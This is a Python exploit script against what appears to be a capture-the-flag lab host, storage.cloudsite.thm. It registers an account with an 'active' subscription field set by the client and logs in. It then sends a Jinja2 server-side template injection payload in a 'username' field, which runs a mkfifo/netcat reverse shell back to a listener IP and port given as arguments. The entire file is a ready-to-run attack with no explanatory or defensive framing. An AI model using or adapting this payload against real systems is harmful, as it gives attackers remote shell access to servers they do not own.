import requests
import argparse

parser = argparse.ArgumentParser(description="Ip  for reverse shell and port")
parser.add_argument("--ip", required=True, help="Your listener IP address")
parser.add_argument("--port", required=True, help="Your listener Port")
args = parser.parse_args()




url = "http://storage.cloudsite.thm/api/register"



data = {
    "email": "test@test.com",
    "password": "test@test.com",
    "subscription": "active"
}
response = requests.post(url, json=data, )
print(response.text)  

session = requests.Session()
login = "http://storage.cloudsite.thm/api/login"

login_data = {
    "email":"test@test.com",
    "password":"test@test.com"
}



response = session.post(login, json=login_data, )



print("Status:", response.status_code)

print("Cookies:", session.cookies.get_dict())


rce = "http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot"

headers1 = {
    "Content-Type": "application/json"
}


Coaokie = session.cookies.get_dict()

payload = f"""{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {args.ip} {args.port} >/tmp/f').read() }}}}"""

rce_data  = {
    "username": payload
}

response = session.post(rce, cookies=Coaokie, headers=headers1 ,json=rce_data )

print("Status:", response.status_code)
print(response.text)